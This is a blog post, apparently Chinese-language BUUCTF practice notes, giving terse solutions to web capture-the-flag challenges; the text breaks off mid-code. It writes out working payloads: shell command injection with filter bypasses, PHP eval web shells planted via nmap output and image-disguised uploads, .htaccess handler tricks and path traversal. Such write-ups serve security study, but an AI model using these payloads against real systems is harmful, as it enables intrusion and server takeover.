<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.1.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"ja1e.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="BUUCTFåˆ·é¢˜">
<meta property="og:type" content="article">
<meta property="og:title" content="Buuctfåˆ·é¢˜ç¬”è®°">
<meta property="og:url" content="https://ja1e.github.io/2022/03/23/buuctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="Ja1e">
<meta property="og:description" content="BUUCTFåˆ·é¢˜">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ja1e.github.io/images/ssrfme.png">
<meta property="og:image" content="https://ja1e.github.io/images/ssrfme2.png">
<meta property="og:image" content="https://ja1e.github.io/images/misc2.png">
<meta property="og:image" content="https://ja1e.github.io/images/msic3.png">
<meta property="og:image" content="https://ja1e.github.io/images/misc4.png">
<meta property="article:published_time" content="2022-03-23T11:20:33.000Z">
<meta property="article:modified_time" content="2022-07-13T08:32:43.951Z">
<meta property="article:author" content="Ja1e">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ja1e.github.io/images/ssrfme.png">

<link rel="canonical" href="https://ja1e.github.io/2022/03/23/buuctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>Buuctfåˆ·é¢˜ç¬”è®° | Ja1e</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Ja1e</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Ja1eçš„åšå®¢</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://ja1e.github.io/2022/03/23/buuctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Ja1e">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ja1e">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Buuctfåˆ·é¢˜ç¬”è®°
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-03-23 19:20:33" itemprop="dateCreated datePublished" datetime="2022-03-23T19:20:33+08:00">2022-03-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-07-13 16:32:43" itemprop="dateModified" datetime="2022-07-13T16:32:43+08:00">2022-07-13</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">CTFåˆ·é¢˜</span></a>
                </span>
            </span>

          
            <div class="post-description">BUUCTFåˆ·é¢˜</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="å‘½ä»¤æ³¨å…¥"><a href="#å‘½ä»¤æ³¨å…¥" class="headerlink" title="å‘½ä»¤æ³¨å…¥"></a>å‘½ä»¤æ³¨å…¥</h1><h4 id="ACTF2020-æ–°ç”Ÿèµ›-Exec1"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Exec1" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Exec1"></a>[ACTF2020 æ–°ç”Ÿèµ›]Exec1</h4><p>127.0.0.1;cd ..&#x2F;..&#x2F;..&#x2F;;&#x3D;&#x3D;ls&#x3D;&#x3D;				cdè½¬ç›®å½•;lsæŸ¥çœ‹ç›®å½•</p>
<p>127.0.0.1;cd ..&#x2F;..&#x2F;..&#x2F;;&#x3D;&#x3D;cat&#x3D;&#x3D; flag	  cdè½¬ç›®å½•;catæŸ¥çœ‹æ–‡ä»¶å†…å®¹</p>
<hr>
<h4 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">é€šè¿‡urlä¼ å‚è¿›è¡Œpingæ“ä½œ</span><br><span class="line"></span><br><span class="line">?ip=127.0.0.1;ls				   å‘ç°ç›®æ ‡æ–‡ä»¶flag.php</span><br><span class="line"></span><br><span class="line">?ip=127.0.0.1;cat falg.php		   æ— æ³•æŸ¥çœ‹ï¼Œè¿‡æ»¤äº†ç©ºæ ¼</span><br><span class="line"></span><br><span class="line">?ip=127.0.0.1;cat$IFS$1flag.php    ä½¿ç”¨$IFS$1è¿‡æ»¤ç©ºæ ¼ï¼Œä½†è¿˜æ˜¯æ— æ³•æŸ¥çœ‹</span><br><span class="line"></span><br><span class="line">?ip=127.0.0.1;cat$IFS$1index.php   å‘ç°è¿‡æ»¤äº†å¾ˆå¤šå­—ç¬¦ï¼ˆåŒ…æ‹¬flagï¼‰</span><br><span class="line"></span><br><span class="line">è§£å†³æ–¹æ¡ˆï¼š</span><br><span class="line"></span><br><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php   åˆ©ç”¨$aå‚æ•°æ›¿æ¢gï¼Œç»•è¿‡flagè¿‡æ»¤;flagåœ¨ç½‘é¡µæºä»£ç ä¸­</span><br><span class="line"></span><br><span class="line">?ip=127.0.0.1;cat$IFS$1`ls`            æŠŠlsçš„ç»“æœå½“cat çš„å‚æ•°ç›´æ¥æŸ¥çœ‹,flagåœ¨ç½‘é¡µæºä»£ç </span><br></pre></td></tr></table></figure>

<hr>
<h4 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h4><p>çŸ¥é“nmapå¯ä»¥å†™æ–‡ä»¶å³å¯	&#x3D;&#x3D;-oG&#x3D;&#x3D;</p>
<p><code>127.0.0.1 | &#39; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#39;</code></p>
<p>ç„¶åè®¿é—®<code>/hack.phtml</code></p>
<p>èšå‰‘é“¾æ¥ï¼Œæ‹¿<code>flag</code></p>
<hr>
<h1 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h1><h4 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h4><p>æŸ¥çœ‹æºä»£ç å‘ç°source.phpç›´æ¥è®¿é—®</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>å‘ç°æœ‰ä¸ªhint.phpï¼Œé‚£å°±å…ˆçœ‹çœ‹hint</p>
<p>payload:	?file&#x3D;hint.php</p>
<p>å‘ç°flagåœ¨ffffllllaaaaggggé‡Œ</p>
<p>payload:	?file&#x3D;source.php&#x3D;&#x3D;%253f&#x3D;&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</p>
<hr>
<h4 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h4><p>è®¿é—®index.php.bakæ–‡ä»¶ï¼Œä¸‹è½½æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$key</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$key</span>);</span><br><span class="line">  <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line"> 	 <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¼±ç›¸ç­‰ï¼Œç›´æ¥ä¸Šä¼ <code>?key=123</code></p>
<hr>
<h1 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h1><h4 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h4><p>è¿‡æ»¤äº†â€˜?&gt;â€™ï¼Œé‚£å°±æ¢ä¸ªé©¬ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>åç¼€åä¹Ÿè¿‡æ»¤ï¼Œé‚£å°±ç”¨phtml</p>
<p>ä¸Šä¼ æ—¶æŠ“åŒ…ï¼Œæ”¹æ–‡ä»¶ç±»å‹image&#x2F;jpeg</p>
<p>èœåˆ€è¿æ¥ï¼Œflagåœ¨æ ¹ç›®å½•ä¸‹</p>
<hr>
<h4 id="ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h4><p>é¦–å…ˆjsç»•è¿‡ï¼Œç›´æ¥æŠŠjs è„šæœ¬åˆ æ‰</p>
<p>ç„¶åä¸Šä¼ 4.phtml,å†…å®¹å’Œæå®¢é‚£é¢˜ä¸€æ ·</p>
<p>ä¸Šä¼ æ—¶æŠ“åŒ…ï¼Œæ”¹æ–‡ä»¶ç±»å‹image&#x2F;jpeg</p>
<p>èœåˆ€è¿æ¥ï¼Œflagåœ¨æ ¹ç›®å½•ä¸‹</p>
<hr>
<h4 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h4><p>å…ˆä¸Šä¼ .htaccess</p>
<p>å†…å®¹ä¸ºSetHandler application&#x2F;x-httpd-php</p>
<p>å†ä¸Šä¼ å°é©¬.jpgæ ¼å¼</p>
<hr>
<h4 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h4><p>å…ˆä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œè¦æŠ“åŒ…æ”¹æ–‡ä»¶ç±»å‹</p>
<p>å†ä¸Šä¼ .jpgæ–‡ä»¶ï¼Œä¸èƒ½å‡ºç°&lt;?ï¼Œæ‰€ä»¥ç”¨</p>
<p><code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;1&#39;]);&lt;/script&gt;</code></p>
<p>ç„¶åè¿æ¥èšå‰‘å³å¯</p>
<hr>
<h4 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h4><p>å…ˆä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œè¦æŠ“åŒ…æ”¹æ–‡ä»¶ç±»å‹ï¼ŒåŒæ—¶è¦å†™ä¸Š<code>é­”æœ¯å¹»å¤´</code></p>
<p>åœ¨ä¸Šä¼ å°é©¬å›¾ç‰‡ï¼Œè¿æ¥èšå‰‘å³å¯</p>
<hr>
<h1 id="PHPå­—ç¬¦ä¸²è§£ææ¼æ´"><a href="#PHPå­—ç¬¦ä¸²è§£ææ¼æ´" class="headerlink" title="PHPå­—ç¬¦ä¸²è§£ææ¼æ´"></a>PHPå­—ç¬¦ä¸²è§£ææ¼æ´</h1><p>chr(47)â€”â€”<code>/</code><br>chr(102)â€”â€”<code>f</code><br>chr(49)â€”â€”<code>1</code><br>chr(97)â€”â€”<code>a</code><br>chr(103)â€”â€”<code>g</code></p>
<hr>
<h4 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h4><p>ç›´æ¥1+1æŠ“åŒ…å‘ç°calc.phpæ–‡ä»¶ï¼Œç›´æ¥è®¿é—®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHPå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡WAF</span><br><span class="line"></span><br><span class="line">è¾“å…¥æ—¶å‘ç°numåªèƒ½è¾“å…¥æ•°å­—ï¼Œè¾“å…¥å­—ç¬¦æ— æ³•è§£æã€‚</span><br><span class="line">PHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆå˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š1ï¼Œåˆ é™¤ç©ºç™½å­—ç¬¦ï¼›2ï¼Œå°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰</span><br><span class="line"></span><br><span class="line">ç°åœ¨çš„å˜é‡å«â€œ numâ€ï¼Œè€Œä¸æ˜¯â€œnumâ€ã€‚ä½†phpåœ¨è§£æçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠç©ºæ ¼ç»™å»æ‰ï¼Œè¿™æ ·ä»£ç è¿˜èƒ½æ­£å¸¸è¿è¡Œï¼Œè¿˜ä¸Šä¼ äº†éæ³•å­—ç¬¦ã€‚</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;scandir()&#x3D;&#x3D;å‡½æ•°ï¼šè¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„</p>
<p>&#x3D;&#x3D;var_dump()&#x3D;&#x3D;ï¼šè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯</p>
<p>? num&#x3D;1;var_dump(scandir(chr(47)))	æ‰«æ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯æ˜¯scandir(â€œ&#x2F;â€œ),ä½†æ˜¯â€œ&#x2F;â€è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨chr(â€œ47â€)ç»•è¿‡      </p>
<p>? num&#x3D;1;var_dump(&#x3D;&#x3D;file_get_contents&#x3D;&#x3D;(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))  è¯»å–è¿™ä¸ªæ–‡ä»¶</p>
<hr>
<h4 id="æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h4><p>ç‚¹å‡»èœå•æ çš„buyflag</p>
<p>æŠ“åŒ…å‘ç°phpä»£ç ï¼Œçœ‹</p>
<p>ä¼ å‚ä¸ºpasswordå’Œmoney</p>
<p>å°†cookieçš„user&#x3D;0æ”¹ä¸ºuser&#x3D;1</p>
<p>ä»¥POSTä¼ å‚password&#x3D;404a&amp;money&#x3D;1e9</p>
<p>æ³¨æ„åœ¨httpå¤´éƒ¨è¦å¢åŠ Content-Type: application&#x2F;x-www-form-urlencoded</p>
<hr>
<h4 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h4><p>è¿™é¢˜æ‰“å¼€çœ‹sourceæºä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])); </span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$secret</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span 